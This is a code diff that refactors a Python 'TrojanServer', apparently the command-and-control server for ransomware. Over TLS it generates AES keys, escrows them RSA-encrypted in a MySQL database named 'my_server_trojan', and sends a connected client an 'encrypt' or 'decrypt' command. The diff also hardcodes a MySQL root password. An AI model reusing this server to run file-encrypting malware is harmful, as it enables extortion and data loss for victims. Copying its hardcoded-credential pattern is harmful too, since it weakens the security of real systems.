@@ -12,100 +12,109 @@ import base64
 from random_word import RandomWords
 import protocol
 
-class  TrojanServer:
-    def __init__(self, host, port, cert_file, key_file):
+class SocketConnection:
+    def __init__(self, host, port, cert, key):
         self.host = host
         self.port = port
-        self.cert_path = cert_file
-        self.key_path = key_file
+        self.cert = cert
+        self.key = key
         self.context = self._create_ssl_context()
-    
+
     def _create_ssl_context(self):
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        context.load_cert_chain(certfile=self.cert_path, keyfile=self.key_path)
-        return context
-    
-    def start(self, action):
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.bind((self.host, self.port))
-            s.listen(1)
-            with self.context.wrap_socket(s, server_side=True) as secure_sock:
-                conn, address = secure_sock.accept()
-                with conn:
-                    print(f"Connection from {address} secured with TLS")
-                    self.handle_client(conn, action)
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ctx.load_cert_chain(certfile=self.cert, keyfile=self.key)
+        return ctx
 
-    def handle_client(self, conn, action):
-        if action == "encrypt":
-            aes_key = self.GENERATE_AES_KEY(conn)
-        else:
-            aes_key = self.GET_AES_KEY(conn)
-        
-        protocol.send(conn, aes_key)
-        protocol.send(conn, action)
-        
-        response = protocol.receive(conn).decode()
-        print(response)
-
-    
-    # פונקציות עזר הקשורות ל-DB ו-RSA/AES
-    def generate_aes_key_from_secret_word(self, secret_word):
+    def wait_for_client(self):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.bind((self.host, self.port))
+            sock.listen(1)
+            with self.context.wrap_socket(sock, server_side=True) as ssock:
+                conn, addr = ssock.accept()
+                print(f"[+] Connected from {addr}")
+                return conn
+            
+class KeyManager:
+    def derive_key_from_word(self, word):
         hasher = SHA256.new()
-        hasher.update(secret_word.encode())
+        hasher.update(word.encode())
         return hasher.digest()
+
+    def encrypt_aes_key(self, aes_key, public_key_path="server_RSA_public.pem"):
+        with open(public_key_path, "rb") as f:
+            pub = RSA.import_key(f.read())
+        cipher = PKCS1_OAEP.new(pub)
+        return base64.b64encode(cipher.encrypt(aes_key)).decode()
+
+    def decrypt_aes_key(self, enc_b64, private_key_path="server_RSA_private.pem"):
+        with open(private_key_path, "rb") as f:
+            priv = RSA.import_key(f.read())
+        cipher = PKCS1_OAEP.new(priv)
+        return cipher.decrypt(base64.b64decode(enc_b64))
+
+    def get_random_word(self):
+        return RandomWords().get_random_word()
     
-    def GENERATE_AES_KEY(self, conn):
-        r = RandomWords()
-        random_word = r.get_random_word()
-        aes_key = self.generate_aes_key_from_secret_word(random_word)
-        encrypted_key = self.encrypt_aes_key_with_rsa(aes_key)
-        self.save_encrypted_key_to_db(encrypted_key)
-        return aes_key
     
-    def GET_AES_KEY(self, conn):
-        encrypted_key = self.mysql_retrieve_last_key()
-        aes_key = self.decrypt_RSA_from_AES_key(encrypted_key)
-        return aes_key
+class DatabaseManager:
+    def __init__(self, db_name="my_server_trojan"):
+        self.config = {
+            "host": "localhost",
+            "user": "root",
+            "password": "Galking22!!!",
+            "database": db_name
+        }
 
-
-    def encrypt_aes_key_with_rsa(self, aes_key):
-        with open("server_RSA_public.pem", "rb") as f:
-            public_key = RSA.import_key(f.read())
-        cipher = PKCS1_OAEP.new(public_key)
-        encrypted = cipher.encrypt(aes_key)
-        return base64.b64encode(encrypted).decode()
-
-    def decrypt_RSA_from_AES_key(self, enc_key):
-        with open("server_RSA_private.pem", "rb") as f:
-            private_key = RSA.import_key(f.read())
-        cipher = PKCS1_OAEP.new(private_key)
-        encrypted_bytes = base64.b64decode(enc_key)
-        return cipher.decrypt(encrypted_bytes)
-
-    def save_encrypted_key_to_db(self, key_b64):
-        conn = mysql.connector.connect(
-            host="localhost", user="root", password="Galking22!!!", database="my_server_trojan"
-        )
+    def save_key(self, key_b64):
+        conn = mysql.connector.connect(**self.config)
         cursor = conn.cursor()
         cursor.execute("INSERT INTO encrypted_keys (encrypted_key) VALUES (%s)", (key_b64,))
         conn.commit()
         cursor.close()
         conn.close()
 
-    def mysql_retrieve_last_key(self):
-        conn = mysql.connector.connect(
-            host="localhost", user="root", password="Galking22!!!", database="my_server_trojan"
-        )
+    def get_last_key(self):
+        conn = mysql.connector.connect(**self.config)
         cursor = conn.cursor()
         cursor.execute("SELECT encrypted_key FROM encrypted_keys ORDER BY id DESC LIMIT 1")
         result = cursor.fetchone()
         cursor.close()
         conn.close()
         return result[0] if result else None
-
-
-if __name__ == "__main__":
-    action = "encrypt"  # "encrypt or "decrypt" - set this manually
     
-    server = TrojanServer("0.0.0.0", 44444, "path/to/cert.pem", "path/to/key.pem")
-    server.start(action)
+    
+class TrojanServer:
+    def __init__(self, action, conn):
+        self.action = action
+        self.conn = conn
+        self.db = DatabaseManager()
+        self.keys = KeyManager()
+
+    def run(self):
+        aes_key = self._generate_and_store_key() if self.action == "encrypt" else self._load_and_decrypt_key()
+        protocol.send(self.conn, aes_key)
+        protocol.send(self.conn, self.action)
+        print(protocol.receive(self.conn).decode())
+
+    def _generate_and_store_key(self):
+        word = self.keys.get_random_word()
+        aes_key = self.keys.derive_key_from_word(word)
+        encrypted = self.keys.encrypt_aes_key(aes_key)
+        self.db.save_key(encrypted)
+        return aes_key
+
+    def _load_and_decrypt_key(self):
+        enc = self.db.get_last_key()
+        return self.keys.decrypt_aes_key(enc)
+    
+    
+if __name__ == "__main__":
+    HOST = "0.0.0.0"
+    PORT = 44444
+    CERT = "path/to/cert.pem"
+    KEY = "path/to/key.pem"
+    ACTION = "encrypt"  # או decrypt
+
+    conn = SocketConnection(HOST, PORT, CERT, KEY).wait_for_client()
+    with conn:
+        TrojanServer(ACTION, conn).run()
